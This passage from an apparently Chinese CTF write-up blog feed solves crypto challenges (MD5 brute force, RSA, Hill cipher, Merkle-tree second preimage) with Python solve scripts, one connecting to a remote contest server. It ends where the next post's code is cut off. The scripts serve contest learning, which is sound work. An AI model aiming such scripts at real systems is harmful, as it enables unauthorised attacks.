title="碰碰车"></a>碰碰车</h2><p>这题感觉就像是proof_of_work…<br>单纯的爆破md5<br>直接上脚本把</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">STR1 = <span class="string">&#x27;AGVSCF&#x27;</span></span><br><span class="line">STR2 = <span class="string">&#x27;TZV&#x27;</span></span><br><span class="line">STR3 = <span class="string">&#x27;WBGVHC&#x27;</span></span><br><span class="line">STR4 = <span class="string">&#x27;U&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">            STR = STR1 + i + STR2 + j + STR3 + k + STR4</span><br><span class="line">            <span class="keyword">if</span> md5(STR.encode()).hexdigest().startswith(<span class="string">&#x27;a8f738&#x27;</span>):</span><br><span class="line">                print(STR, md5(STR.encode()).hexdigest())</span><br></pre></td></tr></table></figure><p>得到结果a8f738a65b715ea54900b180865b20af</p><h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h2><p>这题也很简单. 运算一下就可以得到N和phi了(太白给了呀<br>然后正常解rsa就行了<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-40a5d5b833e84712955672210c1e96e7.png" alt="图片.png"><br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">pandq = <span class="number">20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440</span></span><br><span class="line">p2andq2 = <span class="number">208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879</span></span><br><span class="line"></span><br><span class="line">n = (pandq ** <span class="number">2</span> - p2andq2) // <span class="number">2</span></span><br><span class="line">phi = n - pandq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出就是flag了<br><a name='22'></a></p><h2 id="Go-home"><a href="#Go-home" class="headerlink" title="Go home"></a>Go home</h2><p>这题太迷啦…到现在都还没懂出题人的意思.<br>给出的题目是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5</span></span><br><span class="line">p = <span class="number">0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000</span></span><br><span class="line">c=<span class="number">0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203</span></span><br></pre></td></tr></table></figure><p>一开始拿到题的时候, 确实是没想到这里给的p是p的高位. 知道的话就懂是coppersmith了.<br>所以一开始拿到题是去分解n来着, yafu也确实分出p跟q来了(跟出题人聊了下预期解应该是用coppersmith的<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7caf65e71a8c4b8b88b15bac25dcfa56.png" alt="图片.png"><br>因为题目也没给公钥e, 所以试着去爆破了一下e, 然而也没爆出结果.(事实上应该是有结果的, 当e=3的时候肯定能得出结果, 但因为过滤是利用字符串ctf{<br>, 所以没有爆出结果来.</p><p>于是就卡住了… </p><p>因为p很奇怪(没想到这个是p的高位, 导致我觉得c和p调换过来了. 想看看c是否是素数, 扔进 <a href="http://www.factordb.com/">www.factordb.com</a> 出来了一个意想不到的结果<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-a98bb7722c6c468e8063cf8bdb18334f.png" alt="图片.png"><br>啊这…三次方???<br>于是试着对c开三次方根, 然后转成字符串. 确实得到了在可打印字符范围内的一段字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ardyPq2]2lb]A_1q_p]_p1]qm]dsllw&#123;</span><br></pre></td></tr></table></figure><p>ctf,ard ctf,ard ctf,ard<br>对应字母都是位移2位的!<br>扔进工具里位移回来就得到<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6a70c19ef75649d58cdf2a1d9f7f46ee.png" alt="图片.png"><br>(所以最后还是想吐槽一下, 能做出这题真的运气max了.<br><a name='23'></a></p><h2 id="block-cipher"><a href="#block-cipher" class="headerlink" title="block cipher"></a>block cipher</h2><p>连上远程查看源码, 发现明明是个hill密码!(名字却叫分组密码(狗头<br>很显然加密就是将pad之后的明文分为每16个字节一组,构成4*4的矩阵,每组都和密钥矩阵做模乘模数为256.</p><p>所以只需要构造一个在mod256意义下存在逆矩阵的矩阵, 将这个加密后只需要乘上它的逆矩阵就可以得到密钥矩阵了.再求出密钥矩阵的逆矩阵, 就得对密文进行解密. </p><p>对于求模256逆矩阵, 只不过是在原先求逆矩阵的基础上将所有的运算改成模256的意义下进行就行了.</p><p>为了节省时间, 在网上找到了一个现成的求模逆矩阵的脚本, 然后再修改了一些细节.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  <span class="comment"># 计算行列式的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">ValueError</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查矩阵格式是否合法以及是否可逆</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_matrix</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A, <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>], <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>][<span class="number">0</span>], <span class="built_in">int</span>)):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;Invalid matrix format.&#x27;</span>)</span><br><span class="line">    mat = np.array(A)</span><br><span class="line">    D = <span class="built_in">int</span>(np.linalg.det(A)) % M</span><br><span class="line">    <span class="keyword">if</span> gcd(D, M) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;This matrix does not have a modular inversion matrix.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第一类初等变换：交换矩阵第i行与第j行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">A, i, j</span>):</span></span><br><span class="line">    temp = A[j]</span><br><span class="line">    A[j] = A[i]</span><br><span class="line">    A[i] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第二类初等变换：将矩阵第i行乘以n</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_n</span>(<span class="params">A, i, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    A[i] = [a[x] * n % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第三类初等变换：矩阵第i行减去n倍的j行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">A, i, j, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    b = A[j]</span><br><span class="line">    A[i] = [(a[x] - n * b[x]) % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到符合要求的第i行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_row</span>(<span class="params">A, i, M</span>):</span></span><br><span class="line">    start = i</span><br><span class="line">    <span class="keyword">while</span> A[start][i] == <span class="number">0</span> <span class="keyword">or</span> gcd(A[start][i], M) &gt; <span class="number">1</span>:</span><br><span class="line">        start = start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回一个整数的模逆元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_rev</span>(<span class="params">num, mod</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">0</span> <span class="keyword">or</span> gcd(num, mod) &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;modular inversion does not exists.&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i * num % mod != <span class="number">1</span>:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disp</span>(<span class="params">mat</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat[i])):</span><br><span class="line">            print(mat[i][j], end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_rev</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check_matrix(A, M)</span><br><span class="line">        dim = <span class="built_in">len</span>(A)</span><br><span class="line">        <span class="comment"># concatenate with a unit matrix</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j == i:</span><br><span class="line">                    A[i].append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    A[i].append(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># transform</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            target_row = find_row(A, i, M)</span><br><span class="line">            swap(A, i, target_row)</span><br><span class="line">            n = mod_rev(A[i][i], M)</span><br><span class="line">            mul_n(A, i, n, M)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j != i:</span><br><span class="line">                    sub(A, j, i, A[j][i], M)</span><br><span class="line">        <span class="comment"># get result</span></span><br><span class="line">        A_rev = [A[i][dim:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim)]</span><br><span class="line">        <span class="keyword">return</span> A_rev</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = [[<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">43</span>], [<span class="number">42</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">44</span>], [<span class="number">42</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>], [<span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>]] <span class="comment"># 发送过去的明文的矩阵形式</span></span><br><span class="line">M = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">AINV = matrix_rev(A, M)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A = &#x27;***+**),*)**)***&#x27; 发送过去的明文</span></span><br><span class="line">encA = <span class="string">&#x27;6a9acfbf3dc3bf1265ea2e6a470404c1&#x27;</span>  <span class="comment"># 所返回的密文</span></span><br><span class="line">enc_flag = <span class="string">&#x27;1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0&#x27;</span>  <span class="comment"># 加密之后的flag</span></span><br><span class="line">enc_A = np.array([<span class="built_in">int</span>(encA[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encA), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key = np.matmul(enc_A, AINV) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    手动将key转成k的形式了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">k = [[<span class="number">113</span>, <span class="number">213</span>, <span class="number">10</span>, <span class="number">58</span>],</span><br><span class="line">     [<span class="number">178</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">13</span>],</span><br><span class="line">     [<span class="number">216</span>, <span class="number">204</span>, <span class="number">16</span>, <span class="number">149</span>],</span><br><span class="line">     [<span class="number">189</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">189</span>]]</span><br><span class="line">keyinv = np.array(matrix_rev(k, M))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc_flag), <span class="number">32</span>):</span><br><span class="line">    encflag = enc_flag[i:i + <span class="number">32</span>]</span><br><span class="line">    enc_F = np.array([<span class="built_in">int</span>(encflag[j:j + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encflag), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">    f = np.matmul(keyinv, enc_F) % <span class="number">256</span></span><br><span class="line">    f = f.reshape(<span class="number">16</span>, )</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag:ctf{yes-sure-the-plain-is-blocked-right?}<br><a name='24'></a></p><h2 id="ant-forest"><a href="#ant-forest" class="headerlink" title="ant forest"></a>ant forest</h2><blockquote><p>这题居然只有两个人做真的…可能大家都觉得源码太长了不想看吧?我个人是感觉一点都不难的</p></blockquote><p>题目的源码不贴了. 大概是在建一个默克尔树(这个默克尔树我也是第一次接触.<br>网上找了张图, 就是从底部的叶子开始, 哈希之后两个两个为一组, 相加再哈希得到新的一层, 直到得到根节点.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c5a4225fec7e4444819c3167d0a37883.png" alt="图片.png"></p><p>而题目的要求就是输入两次叶子节点, 两次的输入不能相同但最后的树根是相同的.仔细想想其实并不难, 第二次生成树的叶子节点是第一次生成的树的其中一层就行了.(似乎是叫第二次原像攻击?</p><p>知道原理之后就开始写脚本了, 但是过程不太顺利, 因为python3太多数据类型了(转来转去实在是太鸡儿麻烦了…</p><p>所以决定用python2写脚本(确实该用py2写不然太乱了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dohash</span>(<span class="params">dat</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sha256(sha256(dat).digest()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;139.199.203.26&#x27;</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256(start + END).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;XXXX:&#x27;</span>)</span><br><span class="line">END = re.findall(<span class="string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">r&#x27;== (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">con.sendline(proof(END, SHA))</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    con.recv()</span><br><span class="line">    con.send(dic[_])</span><br><span class="line">    con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">con.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">a = dohash(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = dohash(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = dohash(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = dohash(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ab = a + b</span><br><span class="line">cd = dohash(c + d).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(ab)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(cd)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> con.recvuntil(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到!Not in leaves? Here is your reward: ctf{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次HWB肝了4天半数学作业堆了好多…不过总的来说还是学到了很多新东西的(新东西都在wp详细写了, 所以有些地方详细有些地方简略.<br>特别是web, 真的学到了很多新东西,也算是收获满满的<br>Misc也是熟悉了很多套路吧<br>不过学了挺久密码但是没有全部做出来太难受了…<br>所以有趣的加密到底该怎么做…</p><blockquote><p>大概就这些了,前面的大佬太强了, 根本打不过…<br>继续加油吧<br>哦对 文章里有错的地方请大佬务必提醒我!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密&lt;del&gt;是真的有趣&lt;/del&gt;, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的.&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Crypto - onetimepad2, understand the nature of the algorithm</title>
    <link href="http://tearsjin.github.io/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/"/>
    <id>http://tearsjin.github.io/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/</id>
    <published>2020-10-29T16:35:09.000Z</published>
    <updated>2021-03-13T03:10:23.812Z</updated>
    
    <content type="html"><![CDATA[<p>0ctf quals 2017的题, 是之前做过的onetimepad的升级版. 因为这道题涉及到了有限域下乘法, 矩阵乘法, 快速幂, 离散对数, 所以记录一下(学费了学费了…</p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>先上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 